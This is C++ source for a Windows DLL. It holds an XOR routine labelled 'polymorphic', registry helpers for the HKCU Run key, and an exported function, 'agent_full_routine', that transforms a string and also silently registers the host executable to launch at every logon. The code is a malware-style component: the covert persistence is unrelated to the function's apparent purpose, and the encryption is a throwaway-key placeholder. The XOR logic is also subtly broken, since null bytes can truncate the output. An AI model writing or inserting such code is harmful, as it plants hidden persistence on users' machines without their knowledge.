#include <windows.h>
#include <string>
#include <random>
#include <cstring>

// ==================== RANDOM NAME GENERATOR ====================
std::string random_name(size_t len) {
    static const char alphanum[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    static std::mt19937 rng((unsigned int)GetTickCount());
    std::string s;
    for (size_t i = 0; i < len; ++i)
        s += alphanum[rng() % (sizeof(alphanum) - 1)];
    return s;
}

// ==================== POLYMORPHIC STUB FUNCTION ====================
void polymorphic_encrypt(char* data, size_t length, const char* key, size_t key_len) {
    // Placeholder for future encryption chaining
    for (size_t i = 0; i < length; ++i)
        data[i] ^= key[i % key_len];
}

// ==================== REGISTRY PERSISTENCE ====================
bool add_persistence(const std::wstring& exePath, const std::wstring& valueName = L"MyApp") {
    HKEY hKey;
    LPCWSTR regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        LONG lResult = RegSetValueExW(
            hKey,
            valueName.c_str(),
            0,
            REG_SZ,
            reinterpret_cast<const BYTE*>(exePath.c_str()),
            static_cast<DWORD>((exePath.size() + 1) * sizeof(wchar_t))
        );
        RegCloseKey(hKey);
        return lResult == ERROR_SUCCESS;
    }
    return false;
}

bool remove_persistence(const std::wstring& valueName = L"MyApp") {
    HKEY hKey;
    LPCWSTR regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        LONG lResult = RegDeleteValueW(hKey, valueName.c_str());
        RegCloseKey(hKey);
        return lResult == ERROR_SUCCESS || lResult == ERROR_FILE_NOT_FOUND;
    }
    return false;
}

bool is_registered(const std::wstring& valueName = L"MyApp") {
    HKEY hKey;
    LPCWSTR regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    wchar_t data[MAX_PATH];
    DWORD dataSize = sizeof(data);

    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        LONG lResult = RegQueryValueExW(hKey, valueName.c_str(), nullptr, nullptr, (LPBYTE)data, &dataSize);
        RegCloseKey(hKey);
        return lResult == ERROR_SUCCESS;
    }
    return false;
}

// ==================== DLL EXPORT ====================
extern "C" __declspec(dllexport) void agent_full_routine(
    const char* input, char* output, size_t output_len
) {
    std::string keyStr = random_name(8);
    const char* key = keyStr.c_str();

    // Copy input to output safely
    strncpy(output, input, output_len - 1);
    output[output_len - 1] = '\0';

    // Apply polymorphic placeholder
    polymorphic_encrypt(output, strlen(output), key, strlen(key));

    // Add DLL's host executable to startup
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    add_persistence(exePath);
}
